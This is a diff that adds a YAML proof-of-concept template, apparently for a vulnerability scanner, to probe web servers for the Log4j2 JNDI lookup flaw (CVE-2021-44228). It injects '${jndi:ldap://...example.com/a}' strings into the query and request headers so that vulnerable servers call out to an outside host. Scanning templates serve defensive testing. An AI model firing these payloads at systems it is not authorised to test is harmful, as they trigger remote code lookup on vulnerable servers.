@@ -1,0 +1,19 @@
+name: poc-log4j2-rce
+transport: http
+set:
+  r0: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/?q=${jndi:ldap://{{r0}}.example.com/a}"
+      headers:
+        User-Agent: "${jndi:ldap://{{r0}}.example.com/a}"
+        X-Api-Version: "${jndi:ldap://{{r0}}.example.com/a}"
+    expression: response.status == 400 || response.status == 500 || response.body.bcontains("log4j") || response.body.bcontains("lookup")
+expression: r0()
+detail:
+  author: sxel
+  description: Apache Log4j2 JNDI lookup RCE probe (CVE-2021-44228, detection-only OOB marker)
+  severity: critical
+  tags: log4j,java,rce,oob
